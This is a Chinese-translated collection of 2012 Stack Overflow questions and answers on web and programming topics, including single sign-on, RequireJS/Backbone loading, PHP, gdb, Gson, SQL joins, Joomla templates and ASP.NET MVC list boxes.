您登录 example1.com 并在我想选择“自动连接到 example2.net”的设置中输入用户名和密码并将其提交给 example2.net，以便发送用户名和密码

我该怎么做？

接下来，每当我登录到 example1.com 并单击对 example2.net 的访问时，我只想发送用户名和 API 密钥，以便它自动登录。

我该怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T13:47:27.510

这是一个快速算法

1.  用户登录`site1.com`并激活单点登录（可能是一个复选框）。
2.  `site1.com`将为该选项创建一个数据库条目。
3.  例如，用户访问`site2.com`，如果尚未登录，他将被重定向到`site1.com/cross-authenticate.php`。
4.  `site1.com`将有权访问 cookie/会话。
5.  如果用户激活了 Single-Sign-On 选项，`site1.com`将生成一个令牌（可能`base64`是一个非常大且安全生成的数字）并将其存储在数据库中。
6.  `site1.com`将用户重定向到`site2.com/cross-authenticate.php?key=fnapsoufhapoer8hwf9ehrgdosughpa9dhg9aer8gyesrg`例如。
7.  `site2.com`将检查该密钥的数据库，验证用户，然后启动一个有效的会话。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T13:24:04.693

将等保存`$_SESSION`在数据库中。然后检查从一个站点到另一个站点的连接选项是否为**SET**。如果是这样，当用户使用其他网站时，查询数据库（针对用户名或诸如此类）。如果条目存在，则根据数据库值创建 cookie 和会话，否则将用户重新路由回登录页面。

# backbone.js - 未定义主干

> ID：11935056
> 
> 赞同：3
> 
> 时间：2012-08-13T13:18:34.683
> 
> 标签：backbone.js, requirejs

我有一个 Backbone 应用程序，它`Backbone is not defined`从我的代码中使用 Backbone 的不同位置获取非确定性错误。有时它会先加载，然后网站加载，有时则不会。我使用以下作为我的 main.js：

```
require.config({
  paths: {
    jqueryui: 'libs/jquery/jquery-ui',
    underscore: 'libs/underscore/underscore-min',
    backbone: 'libs/backbone/backbone-min',
    text: 'libs/require/text',
    order: 'libs/require/order',
    searchcollector: 'libs/jquery/searchcollector.plugin',
    guiders: 'libs/jquery/guiders'
  },
  shim: {
    'underscore': {
      exports: '_'
    },
    'backbone': {
      deps: ['underscore'],
      exports: 'Backbone'
    }
  }
});

require([
  'views/app',
  'helpers'
], function(app) {
  var app = window.app = new app();
}); 
```

我在用着

```
<script data-main="/assets/js/main" src="/assets/js/libs/require/require-jquery.js"></script> 
```

在我的 HTML 中，所以 jQuery 加载了 require。我从这个（http://stackoverflow.com/questions/8131265/loading-backbone-and-underscore-using-requirejs）SO线程中得到了这个建议，但似乎没有任何效果。Shim 不应该先加载 Backbone，然后使其全局可用吗？任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-14T01:41:55.190

不确定这是否是正确的答案，但我注意到您没有将 jquery 列为 Backbone 依赖项。虽然 Backbone 将 Underscore 列为唯一的硬依赖项，但 Backbone.View 需要 jquery 或 zepto 才能工作。

但为什么，它似乎在某些时候有效？

可能是因为 jQuery 是一个 AMD 模块，所以当您加载时，它有时会先加载，而其他时候则不会。当它在 Backbone 之前加载时，它是可用的并且 Backbone 很高兴。否则，也许，你得到的坏结果。

尝试这样的事情：

在您的路径中添加以下内容：

```
jquery: 'libs/require/require-jquery' 
```

在您的垫片中，添加以下内容：

```
'backbone': {
  deps: ['underscore', 'jquery'],
  exports: 'Backbone'
} 
```

让我知道你得到的结果。我从未使用过 requirejs2.0 的 shim 功能，所以我很好奇我是否正确理解了更深层次的东西。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-19T12:30:21.870

在我看来，在同一个文件中加载 require 和 jquery 有点麻烦。

并且将 jquery 设置为 Backbone 的 deps 是 false 因为 Underscore 需要 jquery，并且它是在 Backbone 之前加载的，所以正确的方法是这样的

```
require.config({
  paths: {
     'jquery': 'path to jquery'
    ,'underscore': 'path to underscore'
    ,'backbone': 'path to backbone'
    **other paths...**
  }
  ,shim: {
     jquery: {
      exports: '$'
    }
    ,'underscore': {
      deps: [ 'jquery' ]
      ,exports: '_'
    }
    ,'backbone': {
      deps: [ 'underscore' ]
      ,exports: 'Backbone'
    }
  }
}); 
```

最后你的标签脚本将是

```
<script data-main="/assets/js/main" src="/assets/js/libs/require.js">
</script> 
```

然后你只需要像这样调用你需要的lib

```
define( [ 'jquery', 'underscore', 'backbone' ],
  function( $, _, Backbone )
  {
    // stuff
  } ); 
```

对于一个模型，你可能不需要 jquery 和下划线，所以只需调用 Backbone 就可以了

```
define( [ 'backbone' ],
  function( Backbone )
  {
    // Backbone.extend ?
  } ); 
```

# php - 通过 CakePHP 使用 array_diff 中的 POST 数据

> ID：11935057
> 
> 赞同：0
> 
> 时间：2012-08-13T13:18:39.117
> 
> 标签：php, cakephp, post

**我正在尝试做的事情：**

使用 array_diff() 函数处理来自多选输入的 POST 数据

**初始代码：**

```
$relations_to_delete=array_diff($selectedEnjeuxMetiers,$this->request->data['EnjeuxMembership']['EnjeuxMetier']); 
```

**问题：**在多选输入中未选择任何内容时它不起作用

**当前解决方案：**

```
 if(!empty($this->request->data['EnjeuxMembership']['EnjeuxMetier'])){
        $relations_to_delete=array_diff($selectedEnjeuxMetiers,$this->request->data['EnjeuxMembership']['EnjeuxMetier']);

   }else{
            $relations_to_delete=$selectedEnjeuxMetiers;
   } 
```

此解决方案有效。!=null 不起作用，gettype()=="array" 也不起作用

**问题：**谁能解释为什么需要 if(!empty()) 测试，以及问题是来自 POST 数据还是 array_diff 函数？

编辑：它适用于 gettype()=="array"。问题是没有数据时的类型不是空数组而是空字符串。

**附加信息：** [关于将 Post 数据转换为数组的方式的 CakePHP 文档。](http://book.cakephp.org/2.0/en/core-libraries/components/request-handling.html#request-handling)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T13:28:30.370

使用函数“empty()”，如果变量等于：

*   ""（一个空字符串）
*   0（0 为整数）
*   "0" (0 作为字符串)
*   空值
*   错误的
*   array() （一个空数组）
*   变量$变量；（声明的变量，但在类中没有值）

当未选择任何选项时，该值应为 "" 或 NULL。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T13:35:44.973

问题是没有数据时的类型不是空数组而是空字符串。

# c# - 使用 C# 在模板文档中填充表格项

> ID：11935064
> 
> 赞同：1
> 
> 时间：2012-08-13T13:19:00.787
> 
> 标签：c#, ms-word, office-interop, docx

我有一个模板文档，它有一个标题部分显示一个人的详细信息，并且有一个带有书表的列表部分。

所有数据都来自 SQL Server 数据库。

在我的网站上，用户单击“生成文档”链接，该链接从预定义/预设计的模板文档创建填充文档。

我发现了许多可以用来填写模板文档的好工具，但我的问题在于表格。我找不到任何支持填充预定义（模板化）表的工具。

我最喜欢[DOCX](http://docx.codeplex.com/)，但我无法填写模板文档中的预定义表格。

是否有任何工具可以让我完成上述场景？有人有这方面的经验吗？

一些示例代码会很棒！

# c++ - 是否可以通过 NM 仅打印用户定义的变量？

> ID：11935073
> 
> 赞同：1
> 
> 时间：2012-08-13T13:19:25.047
> 
> 标签：c++, mingw, nm

nm的输出中有很多系统变量它看起来像这样

```
N
_CRT_MT
_CRT_fmode
_CRT_glob
Dictionary::variable4
namespace1::variable1
__cpu_features
__crt_xc_end__
__crt_xc_start__
__crt_xi_end__
__crt_xi_start__
__crt_xl_start__
__crt_xp_end__
__crt_xp_start__
__crt_xt_end__
__crt_xt_start__
__tls_end__
__tls_start__
__xl_a
__xl_c
__xl_d
__xl_z
_argc
_argv
_bss_end__
_bss_start__
_data_end__
_data_start__
_end__
_fmode
_tls_end
_tls_index
_tls_start
_tls_used
mingw_initltsdrot_force
mingw_initltsdyn_force
mingw_initltssuo_force
variable0
variable10 
```

是否可以仅打印用户定义的变量 - 在本例中为 variable10、variable0、Dictionary::variable1、Dictionary::variable4、N？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T13:26:19.407

从来没听说过。但至少您可以安全地过滤所有以双下划线或下划线 + 大写字母开头的变量，因为这些变量是为实现保留的：

```
$ nm -j foo | grep -v '^_[A-Z]\|^__\+[A-Za-z]'
N
Dictionary::variable4
namespace1::variable1
_argc
_argv
_bss_end__
_bss_start__
_data_end__
_data_start__
_end__
_fmode
_tls_end
_tls_index
_tls_start
_tls_used
mingw_initltsdrot_force
mingw_initltsdyn_force
mingw_initltssuo_force
variable0
variable10 
```

您可能可以通过添加可靠地表示实现定义的标识符的其他模式来进行更多过滤。

或者，创建一个空的可执行文件（即*不*包含用户定义符号的可执行文件）并通过以下方式计算`nm`每个可执行文件的输出差异[`comm`](http://en.wikipedia.org/wiki/Comm)：

```
$ # Preparation
$ echo 'int main() { }' > mt.cpp
$ g++ -o mt.out mt.cpp
$ nm -j mt.out > mt.symbols
$ 
$ nm -j your_exe > your_exe.symbols
$ comm -23 your_exe.symbols mt.symbols
N
Dictionary::variable4
namespace1::variable1
variable0
variable10 
```

# gdb - gdb 没有为核心文件加载符号表

> ID：11935075
> 
> 赞同：7
> 
> 时间：2012-08-13T13:19:28.443
> 
> 标签：gdb, symbol-table

在客户端为我的应用程序生成了一个核心转储，在查看回溯时我没有加载符号......

```
(gdb) where
#0  0x000000364c032885 in ?? ()
#1  0x000000364c034065 in ?? ()
#2  0x0000000000000000 in ?? ()
(gdb) bt full
#0  0x000000364c032885 in ?? ()
No symbol table info available.
#1  0x000000364c034065 in ?? ()
No symbol table info available.
#2  0x0000000000000000 in ?? ()
No symbol table info available. 
```

我想在这里提到的一个想法是，正在使用的应用程序是使用 -g 选项构建的。

对我来说，似乎没有加载所需的库。我尝试使用“符号文件”手动加载库，但这无济于事。

可能的问题是什么？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-14T05:55:56.523

> 没有可用的符号表信息。

您可能错误地调用了 GDB。不要这样做：

```
gdb core
gdb -c core 
```

改为这样做：

```
gdb exename core 
```

另请参阅[此答案](https://stackoverflow.com/a/10629444/50617)，了解您可能需要做什么才能从客户的机器上获取内核的有意义的崩溃堆栈跟踪。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2021-11-30T09:36:28.220

我遇到了类似的问题，后来发现我缺少 -g 选项，请确保您已使用 -g 编译了二进制文件。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-06-13T10:44:08.027

当您`gdb`使用与生成核心转储的路径不对应的可执行文件的路径运行时，就会发生这种情况。

确保为 gdb 提供正确的路径。

```
<put an example of correct code or commands here> 
```

# java - 使用gson反序列化Java中的嵌套任意类

> ID：11935076
> 
> 赞同：0
> 
> 时间：2012-08-13T13:19:33.027
> 
> 标签：java, json, arraylist, gson, nested-class

我需要转换 json-string **tmp** => **{"result_count":1,"next_offset":1,"entry_list":[{"id":"xyz123","module_name":"Products","name_value_list": {"id":{"name":"id","value":"xyz123"},"name":{"name":"name","value":"test_product_2"}}}],"relationship_list ":[]}** 转换成对应的 java-pojo

我的 pojo 看起来像

```
public class GetEntryListResponse {

public int result_count = 0;
public int next_offset = 0;
public List<EntryList> entryList = new ArrayList<EntryList>();
public static class EntryList {
    String id = "";
    String module_name = "";
    public static class NameValueList {
        public static class Id {
            String name = "";
            String value = "";
        }
        public static class Name {
            String name = "";
            String value = "";
        }
    }
}
} 
```

并且对于 deserilizing-task 使用

```
Gson json_response = new Gson();
GetEntryListResponse resp = json_response.fromJson(tmp, 
                                                   GetEntryListResponse.class); 
```

我还尝试了其他变体，但这个似乎是迄今为止最好的。问题是 result_count 和 next_offset 被转换为 int 但数组 entryList 的类型为空值。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T13:48:32.763

尝试改变：

```
public List<EntryList> entryList = new ArrayList<EntryList>(); 
```

至：

```
public List<EntryList> entry_list= new ArrayList<EntryList>(); 
```

并反序列化。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T13:31:24.770

为您的班级实施 InstanceCreator 和 JsonDeserializer

```
 public class GetEntryListResponse implements
            InstanceCreator<GetEntryListResponse>,
            JsonDeserializer<GetEntryListResponse>{

    @Override
        public GetEntryListResponse createInstance(Type type) {
            return this;
        }

    @Override
        public GetEntryListResponse deserialize(JsonElement json, Type typeOfT){
      json.getJsonObject();// 
    // create your classes objects here by json key
    } 
```

并使用

```
GsonBuilder builder = new GsonBuilder();
        Gson gson = builder.registerTypeAdapter(GetEntryListResponse.class,
                new GetEntryListResponse()).create(); 
```

# ruby - 如何打印模态对话框的文本

> ID：11935079
> 
> 赞同：1
> 
> 时间：2012-08-13T13:19:45.740
> 
> 标签：ruby, watir-webdriver

如果存在，是否有一种简单的方法来打印模式对话框的文本和/或标题？

```
puts $browser.modal_dialog.text

undefined method `modal_dialog' for #<Watir::Browser:0xa7335d4>

gem list
watir-webdriver (0.6.1) 
```

由于难以预测的阻塞弹出窗口，我必须经常在我的代码中运行：

```
(puts "$browser.modal_dialog.text would be nice here..."; $browser.driver.switch_to.alert.dismiss)    rescue (puts __LINE__.to_s + ": #{$!}"; ) # No alert is present 1282: Modal dialog present 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T14:17:47.903

假设我们正在谈论一个 javascript 警报窗口，以下将为您提供文本。

```
$browser.driver.switch_to.alert.text 
```

我没有任何运气获得头衔。

# mysql - 两个内部连接和第一个子句的 where

> ID：11935081
> 
> 赞同：0
> 
> 时间：2012-08-13T13:19:54.693
> 
> 标签：mysql, sql

我有以下 SQL：

```
SELECT * FROM wp_postmeta 
INNER JOIN wp_term_relationships ON wp_postmeta.post_id = wp_term_relationships.object_id AND wp_term_relationships.term_taxonomy_id = '10' 
INNER JOIN wp_posts ON wp_postmeta.post_id = wp_posts.id WHERE wp_posts.post_date BETWEEN CONCAT(CURDATE(),' 10:00:00') AND CONCAT(CURDATE(),' 18:00:00')
WHERE wp_postmeta.meta_key = '_shipping_country' AND wp_postmeta.meta_value IN ('AU', 'US', 'JP', 'BR', 'UK')
ORDER BY wp_postmeta.post_id DESC 
```

为什么它不起作用的任何原因，但如果我删除第二个`INNER JOIN`它工作正常？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T13:22:11.800

你不能有`WHERE`内部连接条件。

```
SELECT * FROM wp_postmeta 

INNER JOIN wp_term_relationships ON wp_postmeta.post_id = wp_term_relationships.object_id AND wp_term_relationships.term_taxonomy_id = '10' 
INNER JOIN wp_posts ON wp_postmeta.post_id = wp_posts.id AND wp_posts.post_date BETWEEN CONCAT(CURDATE(),' 10:00:00') AND CONCAT(CURDATE(),' 18:00:00')
WHERE wp_postmeta.meta_key = '_shipping_country' AND wp_postmeta.meta_value IN ('AU', 'US', 'JP', 'BR', 'UK')
ORDER BY wp_postmeta.post_id DESC 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T13:22:34.217

是的：虽然可能有一些`wp_postmeta`具有相应`wp_term_relationships`的 ，而一些具有`wp_posts`，但没有两者兼有。

要了解有关您的数据的更多信息，请将您的联接更改为`LEFT JOIN`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T13:23:20.497

同一个查询中不能有两个`WHERE`子句。

您需要做的就是将第一个`WHERE`条件移到现有子句中，或者将其`AND`设置为 Join：

任何一个：

```
SELECT * FROM wp_postmeta 
INNER JOIN wp_term_relationships ON wp_postmeta.post_id = wp_term_relationships.object_id AND wp_term_relationships.term_taxonomy_id = '10'  
INNER JOIN wp_posts ON wp_postmeta.post_id = wp_posts.id AND wp_posts.post_date BETWEEN CONCAT(CURDATE(),' 10:00:00') AND CONCAT(CURDATE(),' 18:00:00') 
WHERE wp_postmeta.meta_key = '_shipping_country' AND wp_postmeta.meta_value IN ('AU', 'US', 'JP', 'BR', 'UK') 
ORDER BY wp_postmeta.post_id DESC 
```

或者：

```
SELECT * FROM wp_postmeta       
INNER JOIN wp_term_relationships ON wp_postmeta.post_id = wp_term_relationships.object_id AND wp_term_relationships.term_taxonomy_id = '10'  
INNER JOIN wp_posts ON wp_postmeta.post_id = wp_posts.id 
WHERE wp_postmeta.meta_key = '_shipping_country' AND wp_postmeta.meta_value IN ('AU', 'US', 'JP', 'BR', 'UK') 
AND wp_posts.post_date BETWEEN CONCAT(CURDATE(),' 10:00:00') AND CONCAT(CURDATE(),' 18:00:00') 
ORDER BY wp_postmeta.post_id DESC 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-13T13:22:14.897

您有两个“WHERE”语句。那可能是个问题:)

# flash - 影片剪辑未正确指向鼠标 //AS2

> ID：11935088
> 
> 赞同：1
> 
> 时间：2012-08-13T13:20:11.113
> 
> 标签：flash, actionscript-2

我使用此代码使我的影片剪辑指向我的鼠标所在的位置，但它没有正确转动。好像变了一样。像影片剪辑的中心是错误的？任何人都可以帮助我吗？

```
onClipEvent(enterFrame){
   dx = _parent._xmouse-_x;
   dy = _parent._ymouse-_y;
   angle = Math.atan2(dy, dx);
   _rotation = angle * 180/Math.PI;
}

onClipEvent(enterFrame){
   if(Key.isDown(68)){
      this._x += 1.5;
   }
   if(Key.isDown(65)){
      this._x -= 1.5;
   }
   if(Key.isDown(87)){
      this._y -= 1.5;
   }
   if(Key.isDown(83)){
      this._y += 1.5;
   }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T06:21:06.130

这很可能与您正在处理的 MovieClip 的轴心点位于中心以外的其他位置有关。输入 flash，在你正在旋转的 mc 中，放置它，使质心位于 0,0

# ubuntu - 我的 Amazon EC 2 运行的是 Amazon Linux 还是 Ubuntu？

> ID：11935091
> 
> 赞同：0
> 
> 时间：2012-08-13T13:20:19.227
> 
> 标签：ubuntu, amazon-ec2, amazon-web-services

我在这里有点困惑。我使用 Ubuntu Linux 64 位 12.04 LTS 创建了一个 Amazon EC2 实例，现在当我 SSH 进入它时，我得到以下信息

![在此处输入图像描述](../Images/0b7aaea2ccf18b2a8e19fcdd3505f177.png)

但在亚马逊管理控制台上，我得到以下信息

![在此处输入图像描述](../Images/bbb53cd9065976c2dae33c71ba0df87c.png)

这里有什么问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T15:11:39.527

这绝对是 Amazon Linux（基于 CentOS），而不是 Ubuntu。另一个提示是，Amazon Linux 中的默认用户名通常是“ec2-user”，而在 Ubuntu 中则是“ubuntu”（至少如果您使用默认的库存 AMI）。我不知道它与您创建它时选择的内容有何不同，但我想这要么是人为错误，要么是奇怪的错误。

**编辑**：为了记录，问题在于他使用旧的 EBS 卷（具有 Amazon AMI）作为根卷。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T17:29:22.460

ami-acf6b0fe 确实是 Amazon EC2 的 ap-southeast-1（新加坡）区域中的官方 Ubuntu 12.04 LTS Precise AMI。

您列出的欢迎消息确实适用于 Amazon Linux。

这意味着您的 AWS 控制台中列出的 EC2 实例*不是*您通过 ssh 连接的 EC2 实例。

您应该仔细检查 IP 地址、主机名、实例 ID、AWS 账户和 EC2 区域。

# database - vb.net 比较 2 个数据库

> ID：11935096
> 
> 赞同：0
> 
> 时间：2012-08-13T13:20:52.277
> 
> 标签：database, vb.net, ms-access

我有 Database1 和 Database2，我将它们中的每一个添加到一个数据表对象中。现在 Database1 通过 Access 更改，记录可能会添加删除或行数据可能会更改。所以数据库看起来像

```
+----+----------+-------+-------+
| ID |   Name   | Price | Sales |
+----+----------+-------+-------+
|  1 | ProductA |   453 |    55 |
|  2 | ProductB |    43 |   156 |
|  3 | ProductC |    22 |   161 |
+----+----------+-------+-------+ 
```

因此，如果我删除 Product ID=1 的行，我希望它在第二个 Database2 中删除该记录在 Database2 中的更改。

现在的问题是两个数据库中的数据库记录的顺序不同，因此循环可能需要很长时间..例如，如果删除了 ID=4000，则我必须遍历整个数据库才能找到它。

那么除了很多循环之外还有其他解决方案吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T13:25:01.720

可以在针对 MS Access 连接运行的 SQL 中引用另一个数据库：

```
 SELECT t1.*, t2.* FROM Table1 t1 
 INNER JOIN [;DATABASE=Z:\Docs\Test.accdb].Table1 t2
 ON t1.ID=t2.ID 
```

从这里，很容易创建查询以查找丢失或更改的记录。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T13:56:12.950

如果 ID 是该行的标识符，那么我认为您不能安全地按照您的要求进行操作。

鉴于上述表 1 的示例

```
+----+----------+-------+-------+
| ID |   Name   | Price | Sales |
+----+----------+-------+-------+
|  1 | ProductA |   453 |    55 |
|  2 | ProductB |    43 |   156 |
|  3 | ProductC |    22 |   161 |
+----+----------+-------+-------+ 
```

并模拟表 2 的乱序情况

```
+----+----------+-------+-------+
| ID |   Name   | Price | Sales |
+----+----------+-------+-------+
|  1 | ProductB |    43 |   156 |
|  2 | ProductA |   453 |    55 |
|  3 | ProductC |    22 |   161 |
+----+----------+-------+-------+ 
```

如果您从表 2 中删除 ID 2，您最终会从表 1 中删除产品 B（而不是产品 A）。我不认为这是你想要的。

您确定 ID 是这些值的主键吗？

# joomla - jdoc 不渲染

> ID：11935102
> 
> 赞同：1
> 
> 时间：2012-08-13T13:21:37.200
> 
> 标签：joomla

我希望你能帮忙。

我有一个 Joomla 2.5 站点，其中包含一组现有的（和工作的）模块，这些模块都很好地显示在主站点上。

由于种种原因，我整理了一个自定义的 Joomla 模板......这是输出： http: [//www.fabulous-women.co.uk/testing.html](http://www.fabulous-women.co.uk/testing.html)

在“headerslice”位置，我复制了工作模块并将它们设置为 headerslice 位置。但是，它拒绝显示。

```
 <?php if ($this->countModules('headerslice' )) : ?>
          <div id="headerslice">
            <jdoc:include type="modules" name='headerslice'/>
          </div>
      <?php endif; ?> 
```

if 语句确实呈现标签......但没有内容。jdoc:include type="header" 在标签中完美呈现。

帮助！

TIA

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-14T04:38:12.647

在 jdoc 语句的右斜杠之前需要一个空格。

尝试：

`<jdoc:include type="modules" name='headerslice' />`

# php - 使用 file_get_contents() 时无法在“þ”上爆炸

> ID：11935105
> 
> 赞同：7
> 
> 时间：2012-08-13T13:21:43.647
> 
> 标签：php

我需要获取远程文件的内容，然后在符号上分解这些内容：“þ”。

如果我要爆炸的字符串只是一个局部变量，我可以让它工作，但我不能让它与 file_get_contents();

```
$string = '1þClassic Los 1/10þþ15þ1þTrueþ2þCú';
$parts = explode("þ", $string);
var_dump($parts); 
```

结果：

```
array(8) {
  [0]=>
  string(1) "1"
  [1]=>
  string(16) "Classic Los 1/10"
  [2]=>
  string(0) ""
  [3]=>
  string(2) "15"
  [4]=>
  string(1) "1"
  [5]=>
  string(4) "True"
  [6]=>
  string(1) "2"
  [7]=>
  string(2) "Cu"
} 
```

* * *

```
$string = file_get_contents('file.txt');
$parts = explode("þ", $string);
var_dump($parts); 
```

结果：

```
array(1) {
  [0]=>
  string(42) "1þClassic Los 1/10þþ15þ1þTrueþ2þCú"
} 
```

为什么我在使用 file_get_contents() 时不能在该符号上爆炸？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-13T13:28:30.323

您在 PHP 脚本中输入的符号编码必须与文本文件中的编码匹配。

确保编码匹配。检查您的 IDE 以查看您的 PHP 脚本保存为什么编码。

如果由于某种原因你不会/不能改变任何一个的编码......

*   如果您的 PHP 脚本是 ISO-8859-1/Windows-1252，并且文本文件是 utf-8，请使用

    ```
    $parts = explode(utf8_encode("þ"), $string); 
    ```

*   如果您的 PHP 脚本是 UTF-8，而文本文件是 ISO-8859-1/Windows-1252，请使用

    ```
    $parts = explode(utf8_decode("þ"), $string); 
    ```

*   如果您的脚本和文本文件是其他组合，您也可以使用`iconv()`.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-13T13:29:36.923

PHP 比较原始字节的爆炸性。字符“þ”可以用几种不同的编码表示，这意味着使用不同的字节。如果将字符保存为源代码中的编码与源代码中的编码不同`file.txt`（例如，分别为 UTF-8 和 Latin1），它们将不匹配，因此不会`explode`.

# asp.net-mvc-3 - 在 MVC3 中将 ListBox 与模型绑定

> ID：11935106
> 
> 赞同：4
> 
> 时间：2012-08-13T13:21:46.103
> 
> 标签：asp.net-mvc-3, c#-4.0, asp.net-mvc-4, asp.net-mvc-areas, ef-database-first

我的模型是

```
public class SiteConfig
{
    public SiteConfig()
    {

    }

    public int IdSiteConfig { get; set; }
    public string Name { get; set; }
    public byte[] SiteLogo { get; set; }
    public string Brands { get; set; }
    public string LinkColour { get; set; }

    public IEnumerable<SiteBrand> SiteBrands { get; set; }
} 
```

和

```
public class SiteBrand
{
    public int Id { get; set; }
    public int SiteId { get; set; }
    public int BrandId { get; set; }

    public Brand Brand { get; set; }
    public SiteConfig SiteConfig { get; set; }
}

public class Brand
{
    public int BrandId { get; set; }
    public string Name { get; set; }

    public IEnumerable<SiteBrand> SiteBrands { get; set; }
} 
```

我正在遵循数据库第一方法。每个 SiteConfig 记录可以包含一个或多个品牌。所以 Brand 正在保存到另一个名为 SiteBrand 的表中。

SiteBrand 包含对 SiteConfig(on IdSiteConfig) 和 Brand(BrandId) 的外键引用。

当我创建站点配置时，我想将所有可用的品牌显示为列表框，用户可以在其中选择一条或多条记录（可能不选择任何品牌）。

但是，当我将视图与模型绑定时，如何将列表框绑定到品牌列表以及发布视图时如何获取所选品牌。

而且我必须将 SiteConfig 对象与所​​选项目一起保存到数据库中。这是我的数据库图。

这是我的 DAL，它保存到 db。

```
public SiteConfig Add(SiteConfig item)
    {
        var siteConfig = new Entities.SiteConfig
            {
                Name = item.Name,
                LinkColour = item.LinkColour,
                SiteBrands = (from config in item.SiteBrands
                              select new SiteBrand {BrandId = config.BrandId, SiteId = config.SiteId}).
                    ToList()
            };
        _dbContext.SiteConfigs.Add(siteConfig);
        _dbContext.SaveChanges();
        return item;
    } 
```

![数据库架构](../Images/50922844f246d0c51bb50fc5959bb4a2.png)

有人可以建议如何绑定列表框并获取所选项目。

谢谢。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-08-13T14:31:42.073

向字符串数组类型的 SiteConfig ViewModel 添加一个新属性。`Listbox`我们将使用它从用户发布此表单时 获取 Selected 项目。

```
public class SiteConfig
{
  //Other properties here
  public string[] SelectedBrands { get; set; }  // new proeprty
  public IEnumerable<SiteBrand> SiteBrands { get; set; }
} 
```

在您的 GET 操作方法中，获取`SiteBrands`并分配给`SiteBrands`SiteConfig ViewModel 对象的属性的列表

```
public ActionResult CreateSiteConfig()
{
    var vm = new SiteConfig();
    vm.SiteBrands = GetSiteBrands();
    return View(vm);
} 
```

出于演示目的，我只是对该方法进行了硬编码。当您实现这一点时，您可能会从数据访问层获取数据。

```
public IList<SiteBrand> GetSiteBrands()
{
    List<SiteBrand> brands = new List<SiteBrand>();
    brands.Add(new SiteBrand { Brand = new Brand { BrandId = 3, Name = "Nike" } });
    brands.Add(new SiteBrand { Brand = new Brand { BrandId = 4, Name = "Reebok" } });
    brands.Add(new SiteBrand { Brand = new Brand { BrandId = 5, Name = "Addidas" } });
    brands.Add(new SiteBrand { Brand = new Brand { BrandId = 6, Name = "LG" } });
    return brands;
} 
```

现在在你的视图中，它是对`SiteConfig`ViewModel 的强类型，

```
@model SiteConfig
<h2>Create Site Config</h2>
@using (Html.BeginForm())
{
  @Html.ListBoxFor(s => s.SelectedBrands, 
                new SelectList(Model.SiteBrands, "Brand.BrandId", "Brand.Name"))
  <input type="submit" value="Create" />
} 
```

`SelectedBrands`现在，当用户发布此表单时，您将在 ViewModel的属性中获得 Selected Items 值

```
[HttpPost]
public ActionResult CreateSiteConfig(SiteConfig model)
{
    if (ModelState.IsValid)
    {
        string[] items = model.SelectedBrands;
        //check items now
        //do your further things and follow PRG pattern as needed
    }
    model.SiteBrands = GetBrands();
    return View(model);
} 
```

![在此处输入图像描述](../Images/a395e9ab52da3d73e518d8c7306bddfa.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T14:06:09.913

您可以拥有一个包含站点和品牌模型的“ViewModel”。然后您可以将您的视图绑定到该模型。这将允许您将视图的任何部分绑定到任何底层模型的任何部分。

```
public class siteViewModel{
    public SiteConfig x;
    public Brand b; //Fill this with all the available brands
} 
```

当然，您可以包含您的视图可能需要的任何其他信息（也减少了 ViewBag 的需要）。

# java - 如何设置单独的数据库进行测试？

> ID：11935109
> 
> 赞同：1
> 
> 时间：2012-08-13T13:22:00.740
> 
> 标签：java, database, glassfish, integration-testing

实际上在运行 Selenium 测试用例时。我采用在 Glassfish 中配置的实时（主数据库）数据库。如果我们出于测试目的添加记录，那么它将在主数据库中复制。这个不好知道。那么有没有办法为 Selenium 测试用例提供单独的数据库。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-14T01:37:03.043

对于玻璃鱼：

*   定义 JDBC 连接池资源以引用生产服务器和开发服务器的不同数据库。

*   如果您没有运行两台不同的服务器，那么您的第一步就是修复它，并**运行**不同的服务器。和不同的数据库服务器。永远不要将您的开发机器/服务器指向生产数据，甚至是生产数据库服务器。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-14T02:10:11.690

如果您尝试进行应在部署时运行的单元测试，则必须在单元测试程序中创建第二个连接。

您可能希望为此使用内存数据库，也许是与 java sdk 捆绑在一起的 HSQL，因此您不需要安装任何驱动程序，也不需要在运行测试后清理任何内容。

如何创建第二个连接取决于您使用的是什么，希望您将有一个中心类或方法来获取数据库连接，如下所示：

```
Connection c = MyConnectionClass.getConnection(); 
```

所以你可以很容易地修改 getConnection 方法，这样你就可以为你的测试指出 HSQL 直接连接，如下所示：

```
public Connection getConnection(){
    if(testing){
        Connection c = DriverManager.getConnection("jdbc:hsqldb:mem:mymemdb", "SA", "");
    }else{
        //get your connection from your pool or whatever you are doing right now
    }
} 
```

或者你也可以更正确并为这个类创建一个模拟。但我不确定 selenium 是否支持这个开箱即用。

